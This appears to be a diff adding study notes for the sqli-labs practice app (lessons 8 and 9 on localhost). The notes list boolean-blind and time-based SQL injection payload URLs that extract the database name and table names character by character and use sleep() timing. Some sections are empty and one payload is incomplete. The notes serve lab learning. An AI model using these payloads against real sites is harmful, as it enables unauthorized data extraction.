@@ -1,0 +1,44 @@
+http://localhost/sqli-labs/Less-8/?id=2'-- -
+http://localhost/sqli-labs/Less-8/?id=2' order by 4-- -
+3 column
+http://localhost/sqli-labs/Less-8/?id=2' or 1=1-- -
+http://localhost/sqli-labs/Less-8/?id=-2' or 1=0-- -
+output
+
+
+Blind Boolean Sql Injection:
+http://localhost/sqli-labs/Less-8/?id=-2' or 1=0-- -
+http://localhost/sqli-labs/Less-8/?id=-2' or length(database())=-- -
+
+Length is 8... 
+
+Database name,
+http://localhost/sqli-labs/Less-8/?id=-2' or ascii(substr(database(),1,1))=115-- -
+
+
+Table name,
+http://localhost/sqli-labs/Less-8/?id=-2' or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115-- -
+
+column name 
+
+
+data 
+
+
+Time Based Sql Injection,
+
+http://localhost/sqli-labs/Less-9/?id=-1' or 1=0-- -
+http://localhost/sqli-labs/Less-9/?id=-1" or 1=0-- -
+http://localhost/sqli-labs/Less-9/?id=-1' or if(1=1,sleep(5),null)-- -
+http://localhost/sqli-labs/Less-9/?id=-1' or if(1=0,sleep(5),null)-- -
+http://localhost/sqli-labs/Less-9/?id=-1' or if(length(database())<8,sleep(5),null)-- - 
+
+
+
+OutFile
+
+
+
+
+
+
